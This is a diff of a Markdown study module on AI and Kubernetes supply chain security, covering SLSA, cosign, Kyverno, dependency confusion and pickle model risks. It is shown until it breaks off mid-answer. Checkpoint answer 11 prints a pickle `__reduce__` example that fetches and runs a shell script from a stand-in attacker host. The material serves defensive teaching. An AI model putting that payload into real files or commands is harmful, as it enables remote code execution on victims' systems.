-5. **Securing the Python/CUDA Dependency Chain (`--require-hashes`, `--only-binary=:all:`, Private Index vs. `--extra-index-url` Dependency Confusion):** Using `audit_ml_model_and_pip_supply_chain()` in `code/part05/supply_chain_policy_verifier.py`, explain how a public PyPI package with a higher version number hijacks an internal package name when `--extra-index-url` is used, and design a hermetic multi-stage Python/CUDA build (`uv pip compile --generate-hashes` + `pip install --require-hashes --only-binary=:all:` + BuildKit `--network=none`).
-6. **AI Model and Dataset Supply Chain (`safetensors` vs. `pickle`, `weights_only=True`, `trust_remote_code=False`, OpenSSF `model-signing`) and Supply-Chain Incident Response:** Explain why Python `pickle` (`.pt`/`.bin`/`.pkl`) executes arbitrary code inside `__reduce__` during `torch.load()`, how `safetensors` and `model-signing` / OCI model artifacts (`ORAS`/`KitOps`) secure model weights, and walk through the 6-step incident response playbook in Section 10 for a zero-day CVE or leaked CI signing token.
+1. Build the threat model for an end-to-end AI software supply chain, running from `Source -> Build -> Dependencies -> Registry -> Deploy -> Runtime`. Map the six attack vectors in Section 1 (`A1..A6`) to real incidents such as SolarWinds, Codecov, `xz`, dependency confusion, malicious pickle models and leaked CI tokens. For each stage, state the defensive control you would use.
+2. Work through the Golden Base Images Antipattern, Cloud Native Buildpacks and in-cluster Tekton build pipelines, as Production Kubernetes, Chapter 15, covers them. Start with `evaluate_quarantine_image_promotion()` in `code/part05/supply_chain_policy_verifier.py`. Explain why forcing teams to rebase all third-party and vendor images onto a single corporate OS base image fails. Then explain how the Quarantine-to-Approved promotion pipeline replaces that approach. Trace the `git-clone` `Task`, the `buildpacks-phases` `Task` and the `clone-and-buildpack` `Pipeline` manifests in Section 3.
+3. Explain the difference between SLSA Build L1, L2 and L3. Then explain how Syft generates SBOMs, which are attached with `cosign attest --type spdxjson`. Cover in-toto attestations and the SPDX and CycloneDX formats as well. Finally, explain how VEX, the Vulnerability Exploitability eXchange, suppresses CVE alerts that are false positives or not exploitable. Each suppression needs a documented justification, and unmitigated, fixable Critical and High CVEs must still be blocked.
+4. Explain how keyless signing with Sigstore and cosign works, and how Kyverno `verifyImages` enforces it. Using `verify_image_signature_and_mutate_digest()` in `code/part05/supply_chain_policy_verifier.py`, trace the `require-signed-images-and-provenance` Kyverno `ClusterPolicy` in Section 5. Show how Fulcio binds a short-lived X.509 certificate to the GitHub Actions OIDC token and logs it in Rekor. Then explain why Notary v1's Globally Unique Name, or GUN, broke across registry mirrors, as Production Kubernetes, Chapter 15, describes. Finally, explain why `mutateDigest: true` is mandatory.
+5. Use `audit_ml_model_and_pip_supply_chain()` in `code/part05/supply_chain_policy_verifier.py` to explain how a public PyPI package with a higher version number can hijack an internal package name when `--extra-index-url` is used. Then design a hermetic, multi-stage Python and CUDA build that you could run in CI. It combines `uv pip compile --generate-hashes`, `pip install --require-hashes --only-binary=:all:` and BuildKit `--network=none`.
+6. Explain why Python `pickle` files (`.pt`, `.bin` and `.pkl`) execute arbitrary code inside `__reduce__` during `torch.load()`. Cover `weights_only=True` and `trust_remote_code=False` along the way. Then explain how `safetensors`, OpenSSF `model-signing` and OCI model artifacts (`ORAS` and `KitOps`) secure model weights. Finally, walk through the 6-step incident response playbook in Section 10 as you would for a zero-day CVE or a leaked CI signing token.
 
 ## Checkpoint questions (20)
 
 <details>
 <summary>1. What is the difference between SLSA Build Level 1, Level 2, and Level 3?</summary>
 
-- **SLSA Build L1 (Provenance Exists):** The build process automatically generates machine-readable provenance metadata (`https://slsa.dev/provenance/v1`) listing what inputs and commands produced the artifact, though it is not yet cryptographically protected against tampering on the build host.
-- **SLSA Build L2 (Hosted & Signed Provenance):** Builds run on a hosted build service (not a developer's laptop), and the build service cryptographically signs the provenance attestation so consumers can verify its authenticity.
-- **SLSA Build L3 (Hardened, Isolated Build Platform):** Builds run in **ephemeral, isolated environments** (one VM/sandbox per build, destroyed immediately afterward) where user-defined build steps **cannot access or forge the signing keys** used by the control plane to sign provenance (**non-falsifiable provenance**).
+- SLSA Build L1, provenance exists: The build process generates machine-readable provenance automatically. It records the inputs and commands that produced the artifact, using `https://slsa.dev/provenance/v1`. That provenance is not yet cryptographically protected against tampering on the build host.
+- SLSA Build L2, hosted and signed provenance: Builds run on a hosted build service, not on a developer's laptop. The service signs the provenance attestation, so consumers can verify it.
+- SLSA Build L3, hardened and isolated build platform: Each build runs in an ephemeral, isolated environment, such as one VM/sandbox per build that is destroyed right after. User-defined build steps cannot access or forge the signing keys that the control plane uses. That is what makes the provenance non-falsifiable.
 </details>
 
 <details>
 <summary>2. In *Production Kubernetes* Chapter 15, what is the "Golden Base Images Antipattern", and what architecture should replace it for third-party/vendor images?</summary>
 
-- **The Golden Base Images Antipattern:** Requiring platform or application teams to take every third-party or vendor container image (such as Postgres, Redis, Envoy, or NVIDIA NGC bases) and manually rebase/repackage its binaries onto a single corporate OS base image (e.g., a hardened corporate RHEL/CentOS image). This breaks upstream libc/library assumptions, duplicates upstream testing, and creates a massive maintenance bottleneck where images rarely get updated—leaving the cluster running *older, more vulnerable* software.
-- **The Replacement Architecture (`PK` Chapter 15):** Use curated minimal bases (`gcr.io/distroless/base` with `USER nonroot:nonroot` or pinned Alpine/Wolfi) for your own **first-party code**, and route **third-party/vendor images** through an automated **Quarantine-to-Approved Image Promotion Pipeline**: mirror the upstream digest into a `quarantine` repo -> run automated CVE/license/user-ID scans -> sign passing digests with your organization's key -> promote to the `approved` repo trusted by cluster admission.
+- The Golden Base Images Antipattern: Teams are required to take every third-party or vendor image, such as Postgres, Redis, Envoy or NVIDIA NGC bases. They must then rebase or repackage its binaries onto one corporate OS base, such as a hardened corporate RHEL or CentOS image. This breaks upstream libc and library assumptions, and it duplicates upstream testing. It also creates a large maintenance bottleneck. Images rarely get updated, so the cluster ends up running older, more vulnerable software.
+- The replacement architecture: Use curated minimal bases for your own first-party code, such as `gcr.io/distroless/base` with `USER nonroot:nonroot`, or pinned Alpine or Wolfi. Route third-party and vendor images through an automated Quarantine-to-Approved Image Promotion Pipeline. Mirror the upstream digest into a `quarantine` repo. Run automated CVE, license and user-ID scans. Sign the digests that pass with your organization's key. Then promote them to the `approved` repo that cluster admission trusts.
 </details>
 
 <details>
-<summary>3. In `PK` Chapter 15, how do `Tekton` (`Task`, `Pipeline`, `Workspace`, `Results`) and `Cloud Native Buildpacks` (`/cnb/lifecycle/builder`) build container images inside Kubernetes without a privileged Docker daemon?</summary>
+<summary>3. In Production Kubernetes Chapter 15, how do `Tekton` (`Task`, `Pipeline`, `Workspace`, `Results`) and `Cloud Native Buildpacks` (`/cnb/lifecycle/builder`) build container images inside Kubernetes without a privileged Docker daemon?</summary>
 
-- **Tekton:** Models CI/CD pipelines as Kubernetes CRDs (`Task`, `Pipeline`, `TaskRun`, `PipelineRun`). A `git-clone` `Task` clones the repository onto a PVC-backed **`Workspace`** (`shared-workspace`) and writes the exact Git commit SHA into **`$(results.commit.path)`** so downstream tasks and provenance generators consume the immutable commit SHA rather than a moving branch ref.
-- **Cloud Native Buildpacks (`buildpacks-phases` `Task` running `/cnb/lifecycle/builder`) / Kaniko / BuildKit rootless:** Detects the application language, compiles the source code, and assembles OCI image layers directly in user space and pushes the image to the registry—**never mounting `/var/run/docker.sock` or requiring `privileged: true` on the build node**.
+- Tekton models CI/CD pipelines as Kubernetes CRDs: `Task`, `Pipeline`, `TaskRun` and `PipelineRun`. A `git-clone` `Task` clones the repository onto a PVC-backed `Workspace`, named `shared-workspace`. It writes the exact Git commit SHA into `$(results.commit.path)`. Downstream tasks and provenance generators then use that immutable SHA, not a moving branch ref.
+- Cloud Native Buildpacks, through the `buildpacks-phases` `Task` that runs `/cnb/lifecycle/builder`, and rootless Kaniko or BuildKit all work this way. They detect the application language, compile the source code and assemble OCI image layers in user space. Then they push the image to the registry. They never mount `/var/run/docker.sock` or require `privileged: true` on the build node.
 </details>
 
 <details>
-<summary>4. In `PK` Chapter 15, why did Notary v1 (`Docker Content Trust`) struggle in multi-registry and edge-cache environments, and how do `cosign` / `Notary v2 (notation)` solve it?</summary>
+<summary>4. In Production Kubernetes Chapter 15, why did Notary v1 (`Docker Content Trust`) struggle in multi-registry and edge-cache environments, and how do `cosign` / `Notary v2 (notation)` solve it?</summary>
 
-Notary v1 identified every signed image by a **Globally Unique Name (`GUN`)** that embedded the **exact registry hostname URL** (`docker.io/acme/app`). If you mirrored or cached that image in an internal Harbor registry or regional pull-through cache (`harbor.internal/acme/app`), Notary v1 signature verification failed because the registry URL did not match the GUN.
-**`cosign` (Sigstore)** and **`notation` (Notary v2)** sign the **content-addressable SHA-256 manifest digest (`@sha256:...`)** and store the signature and attestations as **OCI 1.1 Referrers / artifacts** alongside the image layers—so copying an image across regional or air-gapped registries (`cosign copy` / `oras cp` / Harbor replication) preserves the cryptographic signature seamlessly.
+Notary v1 identified every signed image by a Globally Unique Name, or GUN, that embedded the exact registry hostname URL, such as `docker.io/acme/app`. If you mirrored or cached that image in an internal Harbor registry or a regional pull-through cache, such as `harbor.internal/acme/app`, signature verification failed. The registry URL no longer matched the GUN.
+
+Cosign from Sigstore and notation from Notary v2 sign the content-addressable SHA-256 manifest digest, written `@sha256:...`. They store the signature and attestations as OCI 1.1 referrers or artifacts beside the image layers. Copying the image across regional or air-gapped registries, with `cosign copy`, `oras cp` or Harbor replication, keeps the cryptographic signature intact.
 </details>
 
 <details>
 <summary>5. Walk through how `cosign` "Keyless Signing" works in GitHub Actions or GitLab CI using `OIDC`, `Fulcio`, and `Rekor`.</summary>
 
-1. **OIDC Identity Token:** The CI job requests a short-lived OpenID Connect (`OIDC`) JWT from the CI provider (`https://token.actions.githubusercontent.com`) whose claims prove the exact repository, workflow file path (`.github/workflows/release.yml`), and Git ref (`refs/tags/v1.2.0`).
-2. **Ephemeral Keypair & `Fulcio` Certificate:** `cosign sign` generates a one-time **ephemeral public/private keypair in memory** and sends the public key + OIDC JWT to **Fulcio** (Sigstore's Certificate Authority). Fulcio verifies the OIDC JWT and issues a **short-lived X.509 code-signing certificate (valid for ~10 minutes)** binding the ephemeral public key to the CI workflow's OIDC identity in the certificate's SAN extension.
-3. **Sign & Log in `Rekor`:** `cosign` signs the image digest with the ephemeral private key, records the signature and certificate in **Rekor** (an append-only, tamper-evident transparency log with a signed timestamp proving the signature was created while the 10-minute certificate was valid), and **immediately discards the ephemeral private key from memory**. No long-lived signing private key ever exists to be stolen.
+1. The CI job asks its provider for a short-lived OpenID Connect (`OIDC`) JWT. GitHub Actions, for example, issues one from `https://token.actions.githubusercontent.com`. The token's claims prove the exact repository, the workflow file path (`.github/workflows/release.yml`) and the Git ref (`refs/tags/v1.2.0`).
+2. `cosign sign` generates a one-time ephemeral keypair in memory. It sends the public key and the OIDC JWT to Fulcio, Sigstore's certificate authority. Fulcio verifies the JWT and issues a short-lived X.509 code-signing certificate, valid for about 10 minutes. That certificate binds the ephemeral public key to the CI workflow's OIDC identity in its SAN extension.
+3. Cosign signs the image digest with the ephemeral private key. It records the signature and certificate in Rekor, an append-only, tamper-evident transparency log. Rekor adds a signed timestamp that proves the signature was made while the 10-minute certificate was valid. Cosign then discards the ephemeral private key from memory, so no long-lived signing key exists to steal.
 </details>
 
 <details>
 <summary>6. Why is verifying "any valid Cosign signature" (`subjectRegExp: ".*"`) a critical security mistake in a Kyverno or `policy-controller` admission rule?</summary>
 
-In public Sigstore keyless signing, **anyone on the internet with a GitHub, Google, or Microsoft account can obtain a valid Fulcio certificate for their own identity and sign any container image**. If your admission policy only checks that a valid Fulcio signature exists without restricting **`issuer`** (`https://token.actions.githubusercontent.com`) **AND `subject` / `subjectRegExp`** (`^https://github.com/acme/.+/.github/workflows/release\.yml@refs/tags/v.*$`), an attacker's personal GitHub workflow signature will pass admission. Always pin both the exact OIDC `issuer` and your organization's trusted workflow `subjectRegExp`.
+In public Sigstore keyless signing, anyone with a GitHub, Google or Microsoft account can get a valid Fulcio certificate for their own identity. That person can then sign any container image. If your admission policy only checks that some valid Fulcio signature exists, it does not restrict the `issuer` or the `subject`. The issuer should be `https://token.actions.githubusercontent.com`, and the subject should be matched with `subjectRegExp`, such as `^https://github.com/acme/.+/\.github/workflows/release\.yml@refs/tags/v.*$`. Without those checks, an attacker's personal GitHub workflow signature passes admission. Always pin both the exact OIDC `issuer` and your organization's trusted workflow `subjectRegExp`.
 </details>
 
 <details>
 <summary>7. What is an `in-toto` Attestation (`DSSE`), and how does it differ from a plain image signature?</summary>
 
-- **Plain image signature (`cosign sign`):** Only proves: *"Identity X signed image digest `sha256:abc...`."*
-- **`in-toto` Attestation (`cosign attest`, wrapped in a Dead Simple Signing Envelope `DSSE`):** A signed, structured JSON statement binding a **Subject** (the image digest `sha256:abc...`) to a typed **Predicate** containing verifiable metadata about the artifact, such as:
-  - **`https://slsa.dev/provenance/v1`:** Exact Git commit SHA, builder ID, workflow inputs, and build timestamps.
-  - **`https://spdx.dev/Document` or `https://cyclonedx.org/bom`:** Full Software Bill of Materials (SBOM).
-  - **`https://cosign.sigstore.dev/attestation/vuln/v1`:** Signed vulnerability scan report.
-Admission controllers (Kyverno `attestations.conditions`) can inspect fields inside the signed predicate (e.g., requiring `buildDefinition.buildType` and `resolvedDependencies` to match corporate policy) before admitting a Pod.
+A plain image signature from `cosign sign` only proves that an identity signed a digest. The statement is short: identity X signed image digest `sha256:abc...`.
+
+An in-toto attestation, created with `cosign attest` and wrapped in a Dead Simple Signing Envelope, or DSSE, is richer. It is a signed, structured JSON statement. It binds a Subject, which is the image digest `sha256:abc...`, to a typed Predicate. The Predicate holds verifiable metadata about the artifact. Common predicate types include:
+  - `https://slsa.dev/provenance/v1`, which holds the exact Git commit SHA, builder ID, workflow inputs and build timestamps.
+  - `https://spdx.dev/Document` or `https://cyclonedx.org/bom`, which hold the full Software Bill of Materials (SBOM).
+  - `https://cosign.sigstore.dev/attestation/vuln/v1`, which holds a signed vulnerability scan report.
+
+Admission controllers such as Kyverno can inspect fields inside the signed predicate before they admit a Pod. For example, Kyverno's `attestations.conditions` can require `buildDefinition.buildType` and `resolvedDependencies` to match corporate policy.
 </details>
 
 <details>
 <summary>8. Compare `SPDX` and `CycloneDX` SBOM formats, and explain how an SBOM + `VEX` (Vulnerability Exploitability eXchange) work together during CVE triage.</summary>
 
-- **`SPDX` (Linux Foundation / ISO/IEC 5962)** and **`CycloneDX` (OWASP, with native `ML-BOM` and `VEX` extensions)** are the two standard machine-readable SBOM formats listing every OS package, Python wheel, Go module, and shared library inside an image.
-- **How `VEX` prevents alert fatigue:** A 15 GB PyTorch/CUDA image often contains hundreds of OS/library packages that a scanner flags with CVEs—even when the vulnerable function is never called or the CLI tool is unreachable at runtime. Instead of disabling the scanner or ignoring all alerts, security engineers publish a signed **VEX document (`OpenVEX` / `CycloneDX VEX`)** marking specific `(image_digest, CVE-ID)` pairs as **`not_affected`** with a machine-readable justification (`component_not_present`, `vulnerable_code_not_in_execute_path`), so CI and registry gates automatically suppress known non-exploitable findings while still blocking new real CVEs.
+- SPDX, from the Linux Foundation and ISO/IEC 5962, and CycloneDX, from OWASP with native `ML-BOM` and `VEX` extensions, are the two standard machine-readable SBOM formats. Both list every OS package, Python wheel, Go module and shared library inside an image.
+- VEX helps prevent alert fatigue. Take a 15 GB PyTorch/CUDA image. It often contains hundreds of OS and library packages that a scanner flags with CVEs. Yet the vulnerable function may never be called, or the CLI tool may be unreachable at runtime. Rather than disable the scanner or ignore every alert, security engineers publish a signed VEX document, in OpenVEX or CycloneDX VEX format. It marks specific `(image_digest, CVE-ID)` pairs as `not_affected`, with a machine-readable justification such as `component_not_present` or `vulnerable_code_not_in_execute_path`. CI and registry gates then suppress the known non-exploitable findings, and they still block new real CVEs.
 </details>
 
 <details>
 <summary>9. Why do standard container CVE scanners (`Trivy`, `Grype`, `Clair`) sometimes miss vulnerable C/C++/CUDA libraries inside AI/ML images, and how do you address it?</summary>
 
-Standard scanners primarily inspect **OS package manager databases** (`/var/lib/dpkg/status`, `/var/lib/rpm`) and **language metadata files** (`*.dist-info/METADATA` in Python `site-packages`). However, in AI/ML containers:
-- Large Python wheels (`torch`, `triton`, `flash-attn`, `tensorrt`) **bundle statically linked or vendored `.so` shared libraries** (`libcudnn.so`, `libnccl.so`, `libssl.so`) inside the wheel without registering them in `dpkg`/`rpm`.
-- Custom C++/CUDA extensions compiled from source leave no package manager record.
-**Mitigations:** Use `syft` / `trivy` binary/file analyzers, generate SBOMs *during* the build process where all source/wheel inputs are known, and rebuild atop patched vendor base images (`nvcr.io/nvidia/pytorch:24.xx`) on a monthly cadence.
+Standard scanners mainly read OS package manager databases, such as `/var/lib/dpkg/status` and `/var/lib/rpm`. They also read language metadata files, such as `*.dist-info/METADATA` in Python `site-packages`. AI and ML containers break that model in two ways. Large Python wheels, such as `torch`, `triton`, `flash-attn` and `tensorrt`, bundle statically linked or vendored `.so` shared libraries, such as `libcudnn.so`, `libnccl.so` and `libssl.so`. Those libraries are never registered in `dpkg` or `rpm`. Custom C++ and CUDA extensions compiled from source leave no package manager record at all.
+
+The mitigations are to use the `syft` and `trivy` binary/file analyzers. Generate SBOMs during the build, when all source and wheel inputs are still known. Rebuild on patched vendor base images, such as `nvcr.io/nvidia/pytorch:24.xx`, on a monthly cadence.
 </details>
 
 <details>
 <summary>10. Explain the "Dependency Confusion" attack on Python `pip` installs, and why passing `--extra-index-url` to an internal PyPI server is dangerous.</summary>
 
-Suppose your company has an internal private Python package named `acme-llm-utils==1.2.0` hosted on your internal index, and a Dockerfile runs:
+Suppose your company has an internal package named `acme-llm-utils==1.2.0` on your internal index. A Dockerfile then runs:
 `pip install --extra-index-url https://pypi.internal.acme.com/simple acme-llm-utils`
-Because `--extra-index-url` tells `pip` to query **BOTH public `pypi.org` AND your internal index and install whichever index offers the HIGHEST version number**, an attacker who registers `acme-llm-utils==99.0.0` on public `pypi.org` causes `pip` to download and execute the attacker's public package instead of your internal `1.2.0` package.
-**Three mandatory defenses:**
-1. **Never use `--extra-index-url`:** Use **`--index-url https://pypi.internal.acme.com/simple`** pointing *exclusively* to your internal repository manager (Artifactory / Nexus / devpi), which proxies vetted public packages and blocks external shadowing of internal prefixes.
-2. **Use `--require-hashes` with hash-pinned lockfiles (`uv pip compile --generate-hashes`):** Any wheel whose SHA-256 hash does not match the lockfile is rejected immediately.
-3. **Use `--only-binary=:all:`:** Forbids `pip` from downloading source tarballs (`sdist`) and executing arbitrary `setup.py` code during installation.
+That command tells `pip` to query both public `pypi.org` and your internal index. It installs whichever offers the highest version number. An attacker who registers `acme-llm-utils==99.0.0` on public `pypi.org` therefore gets `pip` to download and run their package, not your internal `1.2.0`.
+
+Three defenses are mandatory.
+1. Never use `--extra-index-url`. Use `--index-url https://pypi.internal.acme.com/simple`, which points exclusively at your internal repository manager, such as Artifactory, Nexus or devpi. That manager proxies vetted public packages and blocks outside shadowing of internal prefixes.
+2. Use `--require-hashes` with hash-pinned lockfiles, generated with `uv pip compile --generate-hashes`. Any wheel whose SHA-256 hash does not match the lockfile is rejected at once.
+3. Use `--only-binary=:all:`. It stops `pip` from downloading source tarballs (`sdist`) and running arbitrary `setup.py` code during installation.
 </details>
 
 <details>
 <summary>11. Why is loading a PyTorch checkpoint with default `torch.load("model.pt")` (Python `pickle`) a Remote Code Execution (`RCE`) vulnerability, and what are the three safe alternatives?</summary>
 
-Traditional PyTorch `.pt` / `.bin` / `.pkl` files are **Python `pickle` streams**. The `pickle` virtual machine allows any pickled object to define a **`__reduce__` method** specifying an arbitrary Python callable and arguments—such as `(os.system, ("curl https://attacker.com/shell.sh | sh",))`—which executes **the instant `torch.load()` unpickles the file**, before the model is even returned.
-**Three safe practices:**
-1. **Use `safetensors` (`model.safetensors`, Hugging Face / MLCommons standard):** Stores a plain JSON header (tensor names, dtypes, shapes, byte offsets) followed by raw flat tensor bytes. **Zero code execution is possible by design**, and weights can be zero-copy `mmap`-loaded directly to CPU/GPU.
-2. **Pass `weights_only=True` in `torch.load("model.pt", weights_only=True)`** (default in PyTorch 2.6+), which restricts the unpickler to primitive tensor data types only.
-3. **Scan untrusted model artifacts in quarantine** with **`modelscan` / `fickling`** before promotion.
+Traditional PyTorch `.pt`, `.bin` and `.pkl` files are Python `pickle` streams. The pickle virtual machine lets any pickled object define a `__reduce__` method, which names an arbitrary Python callable and its arguments. An example is `(os.system, ("curl https://attacker.com/shell.sh | sh",))`. That runs the instant `torch.load()` unpickles the file, before the model is returned. That is why it counts as a remote code execution (RCE) vulnerability.
+
+Three safe practices replace it.
+1. Use `safetensors`, such as `model.safetensors`, the Hugging Face and MLCommons standard. It stores a plain JSON header with tensor names, dtypes, shapes and byte offsets, followed by raw flat tensor bytes. Code execution is impossible by design, and the weights can be memory-mapped straight to CPU or GPU with zero copy.
+2. Pass `weights_only=True`, as in `torch.load("model.pt", weights_only=True)`. It is the default in PyTorch 2.6 and later, and it restricts the unpickler to primitive tensor data types.
+3. Scan untrusted model artifacts in quarantine with `modelscan` or `fickling` before you promote them.
 </details>
 
 <details>
 <summary>12. What does `trust_remote_code=True` in Hugging Face `transformers` (`AutoModel.from_pretrained(..., trust_remote_code=True)`) do, and how do you govern it?</summary>
 
-When `trust_remote_code=True` is passed, `transformers` downloads and **executes custom `.py` modeling/tokenizer files directly from the remote model repository** (`modeling_custom.py`). Even if the model weights are stored in `safetensors`, a malicious or compromised upstream commit in that `.py` file executes arbitrary code inside your training or inference container.
-**Governance:**
-- Never allow `trust_remote_code=True` against mutable branch refs (`main`) or public internet hubs at runtime.
-- Mirror required model repos into your internal artifact store **pinned to an exact audited Git commit SHA (`revision="a1b2c3d..."`)**, review any `.py` files in the repo during quarantine promotion, and block direct internet egress to `huggingface.co` from production namespaces.
+When `trust_remote_code=True` is passed, `transformers` downloads and executes custom `.py` modeling and tokenizer files straight from the remote model repository, such as `modeling_custom.py`. Even when the weights are in `safetensors`, a malicious or compromised upstream commit to that `.py` file runs arbitrary code inside your training or inference container.
+
+Governance comes down to a few rules. Never allow `trust_remote_code=True` against mutable branch refs such as `main`, or against public internet hubs at runtime. Mirror the required model repos into your internal artifact store, pinned to an exact audited Git commit SHA, such as `revision="a1b2c3d..."`. Review any `.py` files during quarantine promotion. Block direct internet egress to `huggingface.co` from production namespaces.
 </details>
 
 <details>
 <summary>13. How do you sign and verify ML model weights and datasets using `OpenSSF model-signing` or OCI Model Artifacts (`ORAS` / `KitOps`)?</summary>
 
-Two complementary approaches:
-1. **OpenSSF `model-signing` (Sigstore):** Computes a cryptographic Merkle tree / manifest hash over every file in a model directory (`model.safetensors`, `config.json`, `tokenizer.json`), signs the manifest via Sigstore (`Fulcio`/`Rekor` or KMS key), and verifies the signature before the model server loads the directory.
-2. **OCI Model Artifacts (`ORAS`, `KitOps`, or Kubernetes `image` volumes):** Packages model weights as OCI layers pushed to your container registry (`registry.example.com/models/llama-3-70b@sha256:...`), signed with **`cosign sign`**, and verified at Pod admission by the exact same Kyverno `verifyImages` policy used for container images.
+There are two complementary approaches.
+1. OpenSSF `model-signing` with Sigstore computes a cryptographic Merkle tree, or manifest hash, over every file in a model directory, such as `model.safetensors`, `config.json` and `tokenizer.json`. It signs that manifest through Sigstore, using Fulcio and Rekor or a KMS key. The model server verifies the signature before it loads the directory.
+2. OCI model artifacts, packaged with `ORAS`, `KitOps` or Kubernetes `image` volumes, push the weights as OCI layers to your container registry, such as `registry.example.com/models/llama-3-70b@sha256:...`. You sign them with `cosign sign`. At Pod admission, the same Kyverno `verifyImages` policy used for container images verifies them.
 </details>
 
 <details>
 <summary>14. Why must admission policies (`verifyImages`) check `initContainers` and `ephemeralContainers` in addition to `spec.containers`?</summary>
 
-`initContainers` and `ephemeralContainers` (`kubectl debug`) run inside the **exact same Pod network namespace, mount the exact same Secret/PVC volumes, and use the exact same `ServiceAccount` token** as `spec.containers`. If an admission policy only validates `spec.containers`, an attacker can put a benign signed `pause` image in `spec.containers` and put an unsigned malicious image inside `spec.initContainers` (or attach an unsigned `ephemeralContainer`) to steal Secrets and data. Kyverno's `verifyImages` rule checks `containers`, `initContainers`, and `ephemeralContainers` by default—never disable those checks.
+`initContainers` and `ephemeralContainers` run inside the same Pod network namespace. They mount the same Secret and PVC volumes, and they use the same `ServiceAccount` token as `spec.containers`. If an admission policy validates only `spec.containers`, an attacker can place a benign signed `pause` image there. They then put an unsigned malicious image in `spec.initContainers`, or attach an unsigned `ephemeralContainer` through `kubectl debug`, to steal Secrets and data. Kyverno's `verifyImages` rule checks `containers`, `initContainers` and `ephemeralContainers` by default. Never disable those checks.
 </details>
 
 <details>
 <summary>15. What are the two most dangerous GitHub Actions CI misconfigurations (`pull_request_target` and unpinned third-party Actions), and how do you fix them?</summary>
 
-1. **`on: pull_request_target` checking out untrusted fork PR code:** Unlike `on: pull_request` (which runs with a read-only token and no secrets on fork PRs), `pull_request_target` runs in the context of the base repository **with write permissions and access to repository secrets**. If a workflow triggered by `pull_request_target` checks out and builds/tests the PR's head commit (`ref: ${{ github.event.pull_request.head.sha }}`), an external attacker opening a PR can exfiltrate all CI secrets and push malicious images.
-2. **Referencing third-party GitHub Actions by mutable tag (`uses: some-org/action@v2`):** If `some-org` is compromised (like the `tj-actions/changed-files` incident), the attacker moves the `@v2` tag to malicious code that steals runner memory/secrets. **Always pin third-party Actions to a full 40-character immutable Git commit SHA** (`uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`) and audit workflows with **`zizmor`** and **`OpenSSF Scorecard`**.
+1. A `pull_request_target` workflow that checks out untrusted fork PR code. Unlike `on: pull_request`, which runs with a read-only token and no secrets on fork PRs, `pull_request_target` runs in the context of the base repository. It has write permissions and access to repository secrets. If a workflow triggered by `pull_request_target` checks out and builds or tests the PR's head commit (`ref: ${{ github.event.pull_request.head.sha }}`), an outside attacker who opens a PR can exfiltrate all CI secrets and push malicious images.
+2. Third-party GitHub Actions referenced by a mutable tag, such as `uses: some-org/action@v2`. If `some-org` is compromised, as happened in the `tj-actions/changed-files` incident, the attacker moves the `@v2` tag to malicious code. That code can steal runner memory and secrets. Always pin third-party Actions to a full 40-character immutable Git commit SHA, such as `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`. Then audit the workflows with `zizmor` and OpenSSF Scorecard.
 </details>
 
 <details>
 <summary>16. How do you make a `Docker BuildKit` compile step hermetic (`RUN --network=none`), and why does it matter?</summary>
 
-In a multi-stage `Dockerfile`:
-1. **Stage 1 (`fetch`):** Downloads dependencies exclusively from your internal hash-verified mirror/proxy.
-2. **Stage 2 (`build`):** Copies the fetched wheels/sources from Stage 1 and runs compilation with **`RUN --network=none pip install --no-index --find-links=/wheels --require-hashes -r requirements.txt`** (and `RUN --network=none make`).
-Because `--network=none` unshares a network namespace with **only a loopback interface and zero external routes**, even if a compromised build script or compiler macro attempts to download a second-stage payload or exfiltrate source code during compilation, the network call fails immediately with `ENETUNREACH`.
+In a multi-stage `Dockerfile`, stage 1, called `fetch`, downloads dependencies only from your internal hash-verified mirror or proxy. Stage 2, called `build`, copies the fetched wheels or sources from stage 1. It then compiles with `RUN --network=none pip install --no-index --find-links=/wheels --require-hashes -r requirements.txt`, and `RUN --network=none make`.
+
+`--network=none` gives the step a network namespace with only a loopback interface and no external routes. So even if a compromised build script or compiler macro tries to download a second-stage payload or exfiltrate source during compilation, the network call fails immediately with `ENETUNREACH`.
 </details>
 
 <details>
 <summary>17. In *Production Kubernetes* Chapter 15, why is Pull-Based GitOps (`Argo CD` / `Flux`) more secure for the software supply chain than Push-Based CI (`kubectl apply` from Jenkins/GitHub Actions)?</summary>
 
-In a **Push-Based CI pipeline**, the CI server must hold **long-lived `cluster-admin` (or broad write) kubeconfig credentials** for every production Kubernetes cluster. If any build job, third-party CI plugin, or runner in the CI system is compromised, the attacker immediately gains direct write access to production clusters.
-In a **Pull-Based GitOps architecture (`PK` Chapter 15)**, the CI pipeline only builds, scans, and signs the container image (and opens a PR bumping the image digest in the deployment Git repo). The **GitOps controller (`Argo CD` / `Flux`) running inside the cluster** pulls reviewed commits from Git—so **zero cluster credentials ever exist in CI**, and every deployment requires a signed, reviewed Git commit.
+In a push-based CI pipeline, the CI server must hold long-lived `cluster-admin`, or broad write, kubeconfig credentials for every production Kubernetes cluster. If any build job, third-party CI plugin or runner is compromised, the attacker gains direct write access to production clusters.
+
+In a pull-based GitOps architecture, as *Production Kubernetes* Chapter 15 describes, the CI pipeline only builds, scans and signs the container image. It then opens a pull request that bumps the image digest in the deployment Git repo. The GitOps controller, Argo CD or Flux, runs inside the cluster and pulls reviewed commits from Git. Zero cluster credentials exist in CI, and every deployment requires a signed, reviewed Git commit.
 </details>
 
 <details>
 <summary>18. How do Runtime Security Controls (`readOnlyRootFilesystem: true`, Default-Deny Egress `NetworkPolicy`, and `Falco`/`Tetragon`) contain a compromised Python dependency that slipped past build checks?</summary>
 
-Suppose a zero-day malicious dependency inside a training container executes at import time:
-1. **`readOnlyRootFilesystem: true` + `allowPrivilegeEscalation: false` + `drop: ["ALL"]`:** The payload cannot modify `/usr`, `/lib`, or Python `site-packages` to persist itself, and cannot escalate privileges.
-2. **Default-Deny Egress `NetworkPolicy`:** When the payload tries to open a reverse shell or POST stolen environment variables/weights to `https://attacker-c2.example.com`, the packet is **dropped at the CNI `veth`/eBPF filter** and logged in Hubble.
-3. **`Tetragon` / `Falco` eBPF Runtime Detection:** Immediately detects the anomalous process tree (`python3 -> /bin/sh -> curl`) or unexpected file read (`/var/run/secrets/...`) and fires a high-priority security alert (or kills the process synchronously via Tetragon `TracingPolicy` `Sigkill` enforcement).
+Suppose a zero-day malicious dependency inside a training container runs at import time.
